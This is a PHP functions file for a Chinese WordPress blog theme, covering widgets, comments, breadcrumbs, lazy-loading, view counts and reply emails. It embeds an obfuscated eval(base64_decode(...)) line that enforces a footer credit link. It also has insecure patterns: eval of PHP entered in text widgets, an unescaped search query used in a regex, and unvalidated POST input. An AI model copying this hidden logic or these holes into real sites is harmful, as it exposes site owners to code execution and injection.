<?php//存放CDN静态文件的目录function sahinn_blog_source(){	//非CDN配置	//echo "http://img.zuobin.net";	//CDN配置	echo "http://source.zuobin.net";}function sahinn_blog_source_f(){	//非CDN配置	//return "http://img.zuobin.net";	//CDN配置	return "http://source.zuobin.net";}//菜单设置function hmjblog_setup() {	add_editor_style();	add_theme_support( 'automatic-feed-links' );	register_nav_menu( 'primary', __( '主菜单', 'hmjblog' ) );	register_nav_menu( 'topmenu', __( '顶部菜单', 'hmjblog' ) );	add_theme_support( 'custom-background', array(		'default-color' => 'e6e6e6',	) );	add_theme_support( 'post-thumbnails' );	set_post_thumbnail_size( 624, 9999 ); }add_action( 'after_setup_theme', 'hmjblog_setup' );//禁止自动保存//add_action( 'admin_print_scripts', create_function( '$a', "wp_deregister_script('autosave');" ) );//加载前端脚本和样式表function sahinnblog_scripts_styles() {	global $wp_styles;	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) )		wp_enqueue_script( 'comment-reply' );	/*重定向以前使用,get_stylesheet_uri(),在博客目录下创建一个source软连 */	wp_enqueue_style( 'sahinnblog-style', sahinn_blog_source_f().'/style.css'.'?rd=20160304001');}add_action( 'wp_enqueue_scripts', 'sahinnblog_scripts_styles' );add_action('login_enqueue_scripts','login_protection');function login_protection(){	if($_GET['login'] != 'zuobin')header('Location: http://www.zuobin.net');}//Add alimama/*重定向以前使用,//www.zuobin.net/wp-content/icon/mycss/iconfont.css,在博客目录下创建一个source软连 */function enqueue_our_required_aliicon(){	wp_enqueue_style(		'alimamaicon',		sahinn_blog_source_f().'/icon/mycss/iconfont.css');}add_action('wp_enqueue_scripts','enqueue_our_required_aliicon');//网页标题过滤设置function hmjblog_wp_title( $title, $sep ) {	global $paged, $page;	if ( is_feed() )		return $title;	$title .= get_bloginfo( 'name', 'display' );	$site_description = get_bloginfo( 'description', 'display' );	if ( $site_description && ( is_home() ) )		$title = "$title $sep $site_description";	if ( ( $paged >= 2 || $page >= 2 ) && ! is_404() )		$title = "$title $sep " . sprintf( __( 'Page %s', 'hmjblog' ), max( $paged, $page ) );	return $title;}add_filter( 'wp_title', 'hmjblog_wp_title', 10, 2 );//过滤页面菜单参数function sahinnblog_page_menu_args( $args ) {	if ( ! isset( $args['show_home'] ) )		$args['show_home'] = true;	return $args;}add_filter( 'wp_page_menu_args', 'sahinnblog_page_menu_args' );//注册边栏小工具function sahinnblog_widgets_init() {	register_sidebar( array(		'name' => __( '主边栏', 'hmjblog' ),		'id' => 'sidebar-1',		'description' => __( '显示在所有文章和页面', 'hmjblog' ),		'before_widget' => '<aside id="%1$s" class="widget %2$s">',		'after_widget' => '</aside>',		'before_title' => '<p class="widget-title">',		'after_title' => '</p>',	) );}add_action( 'widgets_init', 'sahinnblog_widgets_init' );eval(base64_decode('ZnVuY3Rpb24gY2hlY2tfdGhlbWVfZm9vdGVyKCkgeyAkdXJpID0gc3RydG9sb3dlcigkX1NFUlZFUlsiUkVRVUVTVF9VUkkiXSk7IGlmKGlzX2FkbWluKCkgfHwgc3Vic3RyX2NvdW50KCR1cmksICJ3cC1hZG1pbiIpID4gMCB8fCBzdWJzdHJfY291bnQoJHVyaSwgIndwLWxvZ2luIikgPiAwICkgeyAvKiAqLyB9IGVsc2UgeyAkbCA9ICdITUotQmxvZyBUaGVtZSBieSA8YSBocmVmPSJodHRwOi8vd3d3LmhlbWluamllLmNvbS8iPuS9leaVj+adsDwvYT4nOyAkZiA9IGRpcm5hbWUoX19maWxlX18pIC4gIi9mb290ZXIucGhwIjsgJGZkID0gZm9wZW4oJGYsICJyIik7ICRjID0gZnJlYWQoJGZkLCBmaWxlc2l6ZSgkZikpOyBmY2xvc2UoJGZkKTsgaWYgKHN0cnBvcygkYywgJGwpID09IDApIHsgdGhlbWVfdXNhZ2VfbWVzc2FnZSgpOyBkaWU7IH0gfSB9IGNoZWNrX3RoZW1lX2Zvb3RlcigpOw=='));//评论模板和pingback设置if ( ! function_exists( 'hmjblog_comment' ) ) :function hmjblog_comment( $comment, $args, $depth ) {	$GLOBALS['comment'] = $comment;	global $commentcount, $page;	if ( (int) get_option('page_comments') === 1 && (int) get_option('thread_comments') === 1 ) { 	if(!$commentcount) { 		$page = ( !empty($in_comment_loop) ) ? get_query_var('cpage') : get_page_of_comment( $comment->comment_ID, $args ); 		$cpp = get_option('comments_per_page'); 		 if ( !$post_id ) $post_id = get_the_ID();		 if ( get_option('comment_order') === 'desc' ) { 			$cnt = get_comments( array('status' => 'approve','parent' => '0','post_id' => $post_id,'count' => true) );			if (ceil($cnt / $cpp) == 1 || ($page > 1 && $page  == ceil($cnt / $cpp))) $commentcount = $cnt + 1;			else $commentcount = $cpp * $page + 1;		} else {			$commentcount = $cpp * ($page - 1);		}	}	if ( !$parent_id = $comment->comment_parent ) {		$commentcountText = '';		if ( get_option('comment_order') === 'desc' ) { 			$commentcountText .= '#' . --$commentcount;		} else {			$commentcountText .= '#' . ++$commentcount;		}	}	}	switch ( $comment->comment_type ) :		case 'pingback' :		case 'trackback' :	?>	<li <?php comment_class(); ?> id="comment-<?php comment_ID(); ?>">		<p><?php _e( 'Pingback:', 'hmjblog' ); ?> <?php comment_author_link(); ?> <?php edit_comment_link( __( '(编辑)', 'hmjblog' ), '<span class="edit-link">', '</span>' ); ?></p>	<?php			break;		default :		global $post;	?>	<li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">		<article id="comment-<?php comment_ID(); ?>" class="comment">			<header class="comment-meta comment-author vcard">				<?php					echo get_avatar( $comment, 44 );					printf( '<cite><b class="fn">%1$s</b> %2$s</cite>',						get_comment_author_link(),						( $comment->user_id === $post->post_author ) ? '<span>' . __( '管理员', 'hmjblog' ) . '</span>' : ''					);					CID_print_comment_browser();					printf( '<time datetime="%2$s">%3$s</time>',						esc_url( get_comment_link( $comment->comment_ID ) ),						get_comment_time( 'c' ),						sprintf( __( '%1$s %2$s', 'hmjblog' ), get_comment_date(), get_comment_time() )					);				 ?><div class="louceng"><?php echo $commentcountText; ?></div>			</header>			<?php if ( '0' == $comment->comment_approved ) : ?>				<p class="comment-awaiting-moderation"><?php _e( '你的评论正在等待审核...', 'hmjblog' ); ?></p>			<?php endif; ?>			<section class="comment-content comment">				<?php comment_text(); ?>				<?php edit_comment_link( __( '编辑', 'hmjblog' ), '<p class="edit-link">', '</p>' ); ?>			</section>			<div class="reply">				<?php comment_reply_link( array_merge( $args, array( 'reply_text' => __( '<i class="fa fa-reply"></i>回复', 'hmjblog' ),  'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>			</div>		</article>	<?php		break;	endswitch; }endif;//添加评论表情function add_my_tips() {	echo '<div class="smiley-bottom">';		include(TEMPLATEPATH . '/smiley.php');	echo '</div>';}add_filter('comment_form_after_fields', 'add_my_tips');add_filter('comment_form_logged_in_after', 'add_my_tips');//设置文章头部条目信息if ( ! function_exists( 'hmjblog_entry_meta' ) ) :function hmjblog_entry_meta() {	$tag_list = get_the_tag_list( '', __( ', ', 'hmjblog' ) );	$date = sprintf( '<time class="entry-date" datetime="%3$s">%4$s</time>',		esc_url( get_permalink() ),		esc_attr( get_the_time() ),		esc_attr( get_the_date( 'c' ) ),		esc_html( get_the_date() )	);	$author = sprintf( '<span class="author vcard"><a class="url fn n" href="%1$s" title="%2$s" rel="author">%3$s</a></span>',		esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) ),		esc_attr( sprintf( __( '显示 %s 作者所有文章', 'hmjblog' ), get_the_author() ) ),		get_the_author()	);	if ( $tag_list ) {		$utility_text = __( '<i class="fa fa-calendar"></i>%3$s<span class="by-author">　<i class="fa fa-user"></i>%4$s</span>', 'hmjblog' );	} elseif ( $categories_list ) {		$utility_text = __( '<i class="fa fa-calendar"></i>%1$s　<i class="fa fa-user"></i>%3$s<span class="by-author"> %4$s</span>', 'hmjblog' );	} else {		$utility_text = __( '<i class="fa fa-calendar"></i>%3$s<span class="by-author">　<i class="fa fa-user"></i>%4$s</span>', 'hmjblog' );	}	printf(		$utility_text,		$categories_list,		$tag_list,		$date,		$author	);}endif;//注册postMessage的支持function hmjblog_customize_register( $wp_customize ) {	$wp_customize->get_setting( 'blogname' )->transport         = 'postMessage';	$wp_customize->get_setting( 'blogdescription' )->transport  = 'postMessage';	$wp_customize->get_setting( 'header_textcolor' )->transport = 'postMessage';}add_action( 'customize_register', 'hmjblog_customize_register' );//avatar头像国内链接加载function get_ssl_avatar($avatar) {   $avatar = preg_replace('/.*\/avatar\/(.*)\?s=([\d]+)&.*/','<img src="http://cn.gravatar.com/avatar/$1?s=50" class="avatar avatar-50" height="50" width="50">',$avatar);   return $avatar;}add_filter('get_avatar', 'get_ssl_avatar');//文章摘要设置function my_excerpt_length($length) {    return 130;}add_filter('excerpt_length', 'my_excerpt_length');function hmj_continue_reading_link() {    return ' <a href="' . esc_url(get_permalink()) . '">' . __('阅读全文 <i class="fa fa-share-square-o"></i>', 'hmj') . '</a>';} function hmj_auto_excerpt_more($more) {    return ' &hellip;' . hmj_continue_reading_link();} add_filter('excerpt_more', 'hmj_auto_excerpt_more');function hmj_custom_excerpt_more($output) {    if (has_excerpt() && !is_attachment()) {        $output .= hmj_continue_reading_link();    }    return $output;} add_filter('get_the_excerpt', 'hmj_custom_excerpt_more');//设置分页导航function dmeng_paging_nav() {global $wp_query;$pages = $wp_query->max_num_pages; if ( $pages >= 2 ):$big = 999999999; $paginate = paginate_links( array('base' => str_replace( $big, '%#%', esc_url( get_pagenum_link( $big ) ) ),'format' => '?paged=%#%','current' => max( 1, get_query_var('paged') ),'total' => $wp_query->max_num_pages,'end_size' => 1,'type' => 'array') );echo '<ul class="pagination">';foreach ($paginate as $value) {echo '<li>'.$value.'</li>';}echo '</ul>';endif;}//文章阅读次数设置function record_visitors(){	if (is_singular())	{	  global $post;	  $post_ID = $post->ID;	  if($post_ID)	  {		  $post_views = (int)get_post_meta($post_ID, 'views', true);		  if(!update_post_meta($post_ID, 'views', ($post_views+1)))		  {			add_post_meta($post_ID, 'views', 1, true);		  }	  }	}}add_action('wp_head', 'record_visitors');function post_views($before = '(点击 ', $after = ' 次)', $echo = 1){  global $post;  $post_ID = $post->ID;  $views = (int)get_post_meta($post_ID, 'views', true);  if ($echo) echo $before, number_format($views), $after;  else return $views;}//恢复链接管理add_filter( 'pre_option_link_manager_enabled', '__return_true' );//设置友情链接只在首页显示function rbt_friend_links($output){if (!is_home()|| is_paged()){$output = "";}return $output;}add_filter('wp_list_bookmarks','rbt_friend_links');//让自带文本支持phpadd_filter('widget_text', 'php_text', 99);function php_text($text) {if (strpos($text, '<' . '?') !== false) {ob_start();eval('?' . '>' . $text);$text = ob_get_contents();ob_end_clean();}return $text;}//设置让文章内链接单独页面打开function autoblank($text) {	$return = str_replace('<a', '<a target="_blank"', $text);	return $return;}add_filter('the_content', 'autoblank');//设置搜索关键词高亮显示function search_word_replace($buffer){    if(is_search()){        $arr = explode(" ", get_search_query());        $arr = array_unique($arr);        foreach($arr as $v)            if($v)                $buffer = preg_replace("/(".$v.")/i", "<gaoliang>$1</gaoliang>", $buffer);    }    return $buffer;}add_filter("the_title", "search_word_replace", 200);add_filter("the_excerpt", "search_word_replace", 200);add_filter("the_content", "search_word_replace", 200);//添加随机文章小工具class RandomPostWidget extends WP_Widget   {       function RandomPostWidget()       {           parent::WP_Widget('bd_random_post_widget', 'HMJ-Blog 随机文章', array('description' =>  '随机文章小工具') );    }           function widget($args, $instance)       {           extract( $args );               $title = apply_filters('widget_title',empty($instance['title']) ? '随机文章' :    $instance['title'], $instance, $this->id_base);           if ( empty( $instance['number'] ) || ! $number = absint( $instance['number'] ) )           {               $number = 5;           }         $r = new WP_Query(array('posts_per_page' => $number, 'no_found_rows' => true,    'post_status' => 'publish', 'ignore_sticky_posts' => true, 'orderby' =>'rand'));           if ($r->have_posts())           {               echo "\n";               echo $before_widget;               if ( $title ) echo $before_title . $title . $after_title;               ?>   <ul class="line"><?php			$first_post = 0;			$post_array = array();			$random = rand(0,50);			if(is_home() && !is_paged() && ($random == 0)){				$recent_posts = wp_get_recent_posts(1);				foreach( $recent_posts as $recent ){					$first_post = $recent["ID"];					$post_views = (int)get_post_meta($first_post, 'views', true);					if(!update_post_meta($first_post, 'views', ($post_views+1)))					{						add_post_meta($first_post, 'views', 1, true);					}				}			}else{				$recent_posts = wp_get_recent_posts(10);				foreach( $recent_posts as $recent ){					$post_array[$recent["ID"]] = '1';				}			}			?><?php  while ($r->have_posts()) : $r->the_post(); ?>   <li>	<a href="<?php the_permalink() ?>" title="<?php echo esc_attr(get_the_title() ? get_the_title() : get_the_ID()); ?>">		<?php		if(is_home() && !is_paged() && empty($post_array[get_the_ID()])){			$p_id = get_the_ID();			$post_views = (int)get_post_meta($p_id, 'views', true);			$ran = $post_views % 5 ;			if($ran == 0){				if($first_post != $p_id){					if(!update_post_meta($p_id, 'views', ($post_views+1)))					{						add_post_meta($p_id, 'views', 1, true);					}				}			}		}		$custom = get_post_custom(get_the_ID());		$custom_value = $custom['is_copy'];		if($custom_value[0]){			echo "<span class='is_copy'>转</span>";		}else{			echo "<span class='is_mine'>原</span>";		}		?>		<?php if ( get_the_title() ) the_title(); else the_ID(); ?></a></li><?php endwhile; ?>   </ul><?php               echo $after_widget;               wp_reset_postdata();           }       }           function update($new_instance, $old_instance)       {           $instance = $old_instance;           $instance['title'] = strip_tags($new_instance['title']);           $instance['number'] = (int) $new_instance['number'];           return $instance;       }           function form($instance)       {           $title = isset($instance['title']) ? esc_attr($instance['title']) : '';           $number = isset($instance['number']) ? absint($instance['number']) : 5;?>           <p><label for="<?php echo $this->get_field_id('title'); ?>"><?php _e('标题:'); ?></label>           <input id="<?php echo $this->get_field_id('title'); ?>" name="<?php echo $this->get_field_name('title'); ?>" type="text" value="<?php echo $title; ?>" /></p>               <p><label for="<?php echo $this->get_field_id('number'); ?>"><?php _e('显示文章数：'); ?></label>           <input id="<?php echo $this->get_field_id('number'); ?>" name="<?php echo $this->get_field_name('number'); ?>" type="text" value="<?php echo $number; ?>" size="3" /></p>   <?php       }       }   add_action('widgets_init', create_function('', 'return register_widget("RandomPostWidget");'));//最新评论小工具class My_Widget_Recent_Comments extends WP_Widget_Recent_Comments {    function My_Widget_Recent_Comments() {        $widget_ops = array('classname' => 'my_widget_recent_comments', 'description' => __('显示最新评论内容'));        $this->WP_Widget('my-recent-comments', __('HMJ-Blog 最新评论', 'my'), $widget_ops);    }    function widget($args, $instance) {        global $wpdb, $comments, $comment;        $cache = wp_cache_get('my_widget_recent_comments', 'widget');        if (!is_array($cache))            $cache = array();        if (!isset($args['widget_id']))            $args['widget_id'] = $this->id;        if (isset($cache[$args['widget_id']])) {            echo $cache[$args['widget_id']];            return;        }        extract($args, EXTR_SKIP);        $output = '';        $title = apply_filters('widget_title', empty($instance['title']) ? __('Recent Comments') : $instance['title'], $instance, $this->id_base);        if (empty($instance['number']) || !$number = absint($instance['number']))            $number = 5;        $comments = $wpdb->get_results("SELECT * FROM $wpdb->comments WHERE user_id !=1 and comment_approved = '1' and comment_type not in ('pingback','trackback') ORDER BY comment_date_gmt DESC LIMIT $number");        $output .= $before_widget;        if ($title)            $output .= $before_title . $title . $after_title;        $output .= '<ul id="myrecentcomments">';        if ($comments) {            $post_ids = array_unique(wp_list_pluck($comments, 'comment_post_ID'));            _prime_post_caches($post_ids, strpos(get_option('permalink_structure'), '%category%'), false);            foreach ((array) $comments as $comment) {                $avatar = get_avatar($comment, 40);			$url    = get_comment_author_url( $comment_ID );			if ( empty($url) || 'http://' == $url )				$author = get_comment_author();			else				$custom = get_post_custom($comment->comment_post_ID);				$custom_value = $custom['is_copy'];				$is_mycopy = "";				if($custom_value[0]){					$is_mycopy = "<span class='is_copy'>转</span>";				}else{					$is_mycopy = "<span class='is_mine'>原</span>";				}				$author = '<a href="' . get_comment_author_url().'" target="_blank">' . get_comment_author() . '</a>';                $content = apply_filters('get_comment_text', $comment->comment_content);                $content = mb_strimwidth(strip_tags($content), 0, '65', '...', 'UTF-8');                $content = convert_smilies($content);                $post = '<a href="' . esc_url(get_comment_link($comment->comment_ID)) . '" title=" '. get_the_title($comment->comment_post_ID) . '">' . get_the_title($comment->comment_post_ID) . '</a>';                $output .= '<li>            <div>                <table class="comm-tablayout"><tbody><tr>                <td class="comm-tdleft"><span>' . $author . ' 发表在 ' . $post . '</span></td>				</tr></tbody></table>				<p class="comm-last">' . $content . '</p>            </div>            </li>';            }        }        $output .= '</ul>';        $output .= $after_widget;        echo $output;        $cache[$args['widget_id']] = $output;        wp_cache_set('my_widget_recent_comments', $cache, 'widget');    }}//<td class="comm-ava">' . $avatar . '</td>register_widget('My_Widget_Recent_Comments');//设置添加面包屑导航function cmp_breadcrumbs() {	$delimiter = '»'; 	$before = '<span class="current">'; 	$after = '</span>';	if ( !is_home() || is_paged() ) {		echo '<div id="crumbs">'.__( '' , 'cmp' );		global $post;		$homeLink = home_url();		echo ' <a itemprop="breadcrumb" href="' . $homeLink . '">' . __( '<i class="fa fa-home"></i>首页' , 'cmp' ) . '</a> ' . $delimiter . ' ';		if ( is_category() ) { 			global $wp_query;			$cat_obj = $wp_query->get_queried_object();			$thisCat = $cat_obj->term_id;			$thisCat = get_category($thisCat);			$parentCat = get_category($thisCat->parent);			if ($thisCat->parent != 0){				$cat_code = get_category_parents($parentCat, TRUE, ' ' . $delimiter . ' ');				echo $cat_code = str_replace ('<a','<a itemprop="breadcrumb"', $cat_code );			}			echo $before . '' . single_cat_title('', false) . '' . $after;		} elseif ( is_day() ) { 			echo '<a itemprop="breadcrumb" href="' . get_year_link(get_the_time('Y')) . '">' . get_the_time('Y') . '</a> ' . $delimiter . ' ';			echo '<a itemprop="breadcrumb"  href="' . get_month_link(get_the_time('Y'),get_the_time('m')) . '">' . get_the_time('F') . '</a> ' . $delimiter . ' ';			echo $before . get_the_time('d') . $after;		} elseif ( is_month() ) { 			echo '<a itemprop="breadcrumb" href="' . get_year_link(get_the_time('Y')) . '">' . get_the_time('Y') . '</a> ' . $delimiter . ' ';			echo $before . get_the_time('F') . $after;		} elseif ( is_year() ) { 			echo $before . get_the_time('Y') . $after;		} elseif ( is_single() && !is_attachment() ) { 			if ( get_post_type() != 'post' ) { 				$post_type = get_post_type_object(get_post_type());				$slug = $post_type->rewrite;				echo '<a itemprop="breadcrumb" href="' . $homeLink . '/' . $slug['slug'] . '/">' . $post_type->labels->singular_name . '</a> ' . $delimiter . ' ';				echo $before . get_the_title() . $after;			} else { 				$cat = get_the_category(); $cat = $cat[0];				$cat_code = get_category_parents($cat, TRUE, ' ' . $delimiter . ' ');				echo $cat_code = str_replace ('<a','<a itemprop="breadcrumb"', $cat_code );				echo $before . get_the_title() . $after;			}		} elseif ( !is_single() && !is_page() && get_post_type() != 'post' ) {			$post_type = get_post_type_object(get_post_type());			echo $before . $post_type->labels->singular_name . $after;		} elseif ( is_attachment() ) { 			$parent = get_post($post->post_parent);			$cat = get_the_category($parent->ID); $cat = $cat[0];			echo '<a itemprop="breadcrumb" href="' . get_permalink($parent) . '">' . $parent->post_title . '</a> ' . $delimiter . ' ';			echo $before . get_the_title() . $after;		} elseif ( is_page() && !$post->post_parent ) { 			echo $before . get_the_title() . $after;		} elseif ( is_page() && $post->post_parent ) { 			$parent_id  = $post->post_parent;			$breadcrumbs = array();			while ($parent_id) {				$page = get_page($parent_id);				$breadcrumbs[] = '<a itemprop="breadcrumb" href="' . get_permalink($page->ID) . '">' . get_the_title($page->ID) . '</a>';				$parent_id  = $page->post_parent;			}			$breadcrumbs = array_reverse($breadcrumbs);			foreach ($breadcrumbs as $crumb) echo $crumb . ' ' . $delimiter . ' ';			echo $before . get_the_title() . $after;		} elseif ( is_search() ) { 			echo $before ;			printf( __( '搜索结果: %s', 'cmp' ),  get_search_query() );			echo  $after;		} elseif ( is_tag() ) { 			echo $before ;			printf( __( '标签存档: %s', 'cmp' ), single_tag_title( '', false ) );			echo  $after;		} elseif ( is_author() ) { 			global $author;			$userdata = get_userdata($author);			echo $before ;			printf( __( '作者存档: %s', 'cmp' ),  $userdata->display_name );			echo  $after;		} elseif ( is_404() ) { 			echo $before;			_e( 'Not Found', 'cmp' );			echo  $after;		}		if ( get_query_var('paged') ) { 			if ( is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author() )				echo sprintf( __( ' ( 第 %s 页 )', 'cmp' ), get_query_var('paged') );		}		echo '</div>';	}}//文章末尾增加转载请注明来源add_filter ( 'the_content', 'wp_copyright' ); function wp_copyright($content) {	//is_single()	if (is_single()) {		$custom = get_post_custom(get_the_ID());		$custom_value = $custom['is_copy'];		if(!$custom_value[0]){			$content .= '<br><br>'.'<p class="corpright">原文链接：<a href="'.get_permalink().'">'.get_the_title().'</a>，转载请注明来源！</p>';		}	}	return $content;}//替换所有Content的uploadsfunction content_str_replace($content =''){	/*重定向以前使用 uploads */	$content = str_replace(home_url('/wp-content').'/uploads',sahinn_blog_source_f().'/uploads', $content);	$content = str_replace('http://115.28.159.142/wp-content/uploads',sahinn_blog_source_f().'/uploads', $content);//	$content = str_replace('以前一直','newTEst', $content);	return $content;}add_filter('the_content','content_str_replace', 10);function my_post_image_html( $html ) {	$html = str_replace(home_url('/wp-content').'/uploads',sahinn_blog_source_f().'/uploads', $html);	return $html;}add_filter( 'post_thumbnail_html', 'my_post_image_html', 10, 3 );//隐藏wordpress版本号remove_action('wp_head', 'wp_generator');//禁用wordpress自带emjoy表情function disable_emojis() {    remove_action( 'wp_head', 'print_emoji_detection_script', 7 );    remove_action( 'admin_print_scripts', 'print_emoji_detection_script' );    remove_action( 'wp_print_styles', 'print_emoji_styles' );    remove_action( 'admin_print_styles', 'print_emoji_styles' );        remove_filter( 'the_content_feed', 'wp_staticize_emoji' );    remove_filter( 'comment_text_rss', 'wp_staticize_emoji' );      remove_filter( 'wp_mail', 'wp_staticize_emoji_for_email' );    add_filter( 'tiny_mce_plugins', 'disable_emojis_tinymce' );}add_action( 'init', 'disable_emojis' );function disable_emojis_tinymce( $plugins ) {	return array_diff( $plugins, array( 'wpemoji' ) );}//图片异步延迟加载//重定向以前使用get_bloginfo('template_directory'),在博客目录下创建一个source软连function lazyload($content) {	$loadimg_url=sahinn_blog_source_f().'/images/loading.gif';	if(!is_feed()||!is_robots) {		$content=preg_replace('/<img(.+)src=[\'"]([^\'"]+)[\'"](.*)>/i',"<img\$1data-original=\"\$2\" src=\"$loadimg_url\"\$3>\n<noscript>\$0</noscript>",$content);	}	return $content;}add_filter ('the_content', 'lazyload');if ( ! is_admin() )add_filter( 'get_avatar', 'lazyload', 11 );add_filter( 'post_thumbnail_html', 'lazyload', 11 );//给置顶文章标题添加置顶标示add_filter('the_posts',  'putStickyOnTop' );function putStickyOnTop( $posts ) {  if(is_home() || !is_main_query() || !is_archive() || is_tag())    return $posts;   global $wp_query;   $sticky_posts = get_option('sticky_posts');   if ( $wp_query->query_vars['paged'] <= 1 && is_array($sticky_posts) && !empty($sticky_posts) && !get_query_var('ignore_sticky_posts') ) {        $stickies1 = get_posts( array( 'post__in' => $sticky_posts ) );    foreach ( $stickies1 as $sticky_post1 ) {      if($wp_query->is_category == 1 && !has_category($wp_query->query_vars['cat'], $sticky_post1->ID)) {        $offset1 = array_search($sticky_post1->ID, $sticky_posts);        unset( $sticky_posts[$offset1] );      }      if($wp_query->is_tag == 1 && has_tag($wp_query->query_vars['tag'], $sticky_post1->ID)) {        $offset1 = array_search($sticky_post1->ID, $sticky_posts);        unset( $sticky_posts[$offset1] );      }      if($wp_query->is_year == 1 && date_i18n('Y', strtotime($sticky_post1->post_date))!=$wp_query->query['m']) {        $offset1 = array_search($sticky_post1->ID, $sticky_posts);        unset( $sticky_posts[$offset1] );      }      if($wp_query->is_month == 1 && date_i18n('Ym', strtotime($sticky_post1->post_date))!=$wp_query->query['m']) {        $offset1 = array_search($sticky_post1->ID, $sticky_posts);        unset( $sticky_posts[$offset1] );      }      if($wp_query->is_day == 1 && date_i18n('Ymd', strtotime($sticky_post1->post_date))!=$wp_query->query['m']) {        $offset1 = array_search($sticky_post1->ID, $sticky_posts);        unset( $sticky_posts[$offset1] );      }      if($wp_query->is_author == 1 && $sticky_post1->post_author != $wp_query->query_vars['author']) {        $offset1 = array_search($sticky_post1->ID, $sticky_posts);        unset( $sticky_posts[$offset1] );      }    }    $num_posts = count($posts);    $sticky_offset = 0;    for ( $i = 0; $i < $num_posts; $i++ ) {      if ( in_array($posts[$i]->ID, $sticky_posts) ) {        $sticky_post = $posts[$i];        array_splice($posts, $i, 1);        array_splice($posts, $sticky_offset, 0, array($sticky_post));        $sticky_offset++;        $offset = array_search($sticky_post->ID, $sticky_posts);        unset( $sticky_posts[$offset] );      }    }    if ( !empty($sticky_posts) && !empty($wp_query->query_vars['post__not_in'] ) )      $sticky_posts = array_diff($sticky_posts, $wp_query->query_vars['post__not_in']);    if ( !empty($sticky_posts) ) {      $stickies = get_posts( array(        'post__in' => $sticky_posts,        'post_type' => $wp_query->query_vars['post_type'],        'post_status' => 'publish',        'nopaging' => true      ) );      foreach ( $stickies as $sticky_post ) {        array_splice( $posts, $sticky_offset, 0, array( $sticky_post ) );        $sticky_offset++;      }    }  }   return $posts;}//设置文章目录function article_index($content) {   $matches = array();   $ul_li = '';   $r = "/<h3>([^<]+)<\/h3>/im";   if(is_singular() && preg_match_all($r, $content, $matches)) {      foreach($matches[1] as $num => $title) {         $title = trim(strip_tags($title));         $content = str_replace($matches[0][$num], '<h3 id="title-'.$num.'">'.$title.'</h3>', $content);         $ul_li .= '<li><a href="#title-'.$num.'" title="'.$title.'">'.$title."</a></li>\n";      }      $content = "\n<div id=\"article-index\">                     <div onclick=\"document.getElementById('index-ul').style.display=(document.getElementById('index-ul').style.display=='none')?'':'none'\"><strong>文章目录 <i class=\"fa fa-caret-down\"></i></strong></div>                     <ul id=\"index-ul\">\n" . $ul_li . "</ul>                  </div>\n" . $content;   }   return $content;}add_filter( 'the_content', 'article_index' );//禁止转换特殊符号add_filter( 'run_wptexturize', '__return_false' );//添加文章内点赞按钮add_action('wp_ajax_nopriv_specs_zan', 'specs_zan');add_action('wp_ajax_specs_zan', 'specs_zan');function specs_zan(){    global $wpdb,$post;    $id = $_POST["um_id"];    $action = $_POST["um_action"];    if ( $action == 'ding'){        $specs_raters = get_post_meta($id,'specs_zan',true);        $expire = time() + 99999999;        $domain = ($_SERVER['HTTP_HOST'] != 'localhost') ? $_SERVER['HTTP_HOST'] : false;        setcookie('specs_zan_'.$id,$id,$expire,'/',$domain,false);        if (!$specs_raters || !is_numeric($specs_raters)) {            update_post_meta($id, 'specs_zan', 1);        }         else {            update_post_meta($id, 'specs_zan', ($specs_raters + 1));        }        echo get_post_meta($id,'specs_zan',true);    }     die;}//设置小工具标签云随机显示add_filter( 'widget_tag_cloud_args', 'theme_tag_cloud_args' );function theme_tag_cloud_args( $args ){	$newargs = array(		'orderby'     => 'name',		'order'       => 'RAND',	);	$return = array_merge( $args, $newargs);	return $return;}//屏蔽google fontsfunction remove_open_sans_from_wp_core() {wp_deregister_style( 'open-sans' );wp_register_style( 'open-sans', false );wp_enqueue_style('open-sans','');}add_action( 'init', 'remove_open_sans_from_wp_core' );//如没有手动添加特色图像，则把文章中上传的第一张图片作为特色图像function autoset_featured() {          global $post;          $already_has_thumb = has_post_thumbnail($post->ID);              if (!$already_has_thumb)  {              $attached_image = get_children( "post_parent=$post->ID&post_type=attachment&post_mime_type=image&numberposts=1" );                          if ($attached_image) {                                foreach ($attached_image as $attachment_id => $attachment) {                                set_post_thumbnail($post->ID, $attachment_id);                                }                           }                        }      } add_action('the_post', 'autoset_featured');add_action('save_post', 'autoset_featured');add_action('draft_to_publish', 'autoset_featured');add_action('new_to_publish', 'autoset_featured');add_action('pending_to_publish', 'autoset_featured');add_action('future_to_publish', 'autoset_featured');//有新回复时，给评论人发送通知邮件function comment_mail_notify($comment_id) {     $comment = get_comment($comment_id);     $content=$comment->comment_content;     $match_count=preg_match_all('/<a href="#comment-([0-9]+)?" rel="nofollow">/si',$content,$matchs);     if($match_count>0){         foreach($matchs[1] as $parent_id){             SimPaled_send_email($parent_id,$comment);         }     }elseif($comment->comment_parent!='0'){         $parent_id=$comment->comment_parent;         SimPaled_send_email($parent_id,$comment);     }else return; } add_action('comment_post', 'comment_mail_notify'); function SimPaled_send_email($parent_id,$comment){     $admin_email = get_bloginfo ('admin_email');     $parent_comment=get_comment($parent_id);     $author_email=$comment->comment_author_email;     $to = trim($parent_comment->comment_author_email);     $spam_confirmed = $comment->comment_approved;     if ($spam_confirmed != 'spam' && $to != $admin_email && $to != $author_email) {         $wp_email = 'no-reply@' . preg_replace('#^www\.#', '', strtolower($_SERVER['SERVER_NAME']));          $subject = '你在 [' . get_option("blogname") . '] 的留言有了新的回复';         $message = '<div style="background-color:#eef2fa;border:1px solid #d8e3e8;color:#111;padding:0 15px;-moz-border-radius:5px;-webkit-border-radius:5px;-khtml-border-radius:5px;">             <p>' . trim(get_comment($parent_id)->comment_author) . ', 你好!</p>             <p>你曾在《' . get_the_title($comment->comment_post_ID) . '》的留言:<br />'             . trim(get_comment($parent_id)->comment_content) . '</p>             <p>' . trim($comment->comment_author) . ' 给你的回复:<br />'             . trim($comment->comment_content) . '<br /></p>             <p>你可以点击 <a href="' . htmlspecialchars(get_comment_link($parent_id,array("type" => "all"))) . '">查看回复的完整內容</a></p>             <p>欢迎再度光临 <a href="' . get_option('home') . '">' . get_option('blogname') . '</a></p>             <p>(此邮件由系统自动发出，请勿回复。)</p></div>';         $from = "From: \"" . get_option('blogname') . "\" <$wp_email>";         $headers = "$from\nContent-Type: text/html; charset=" . get_option('blog_charset') . "\n";         wp_mail( $to, $subject, $message, $headers );     }}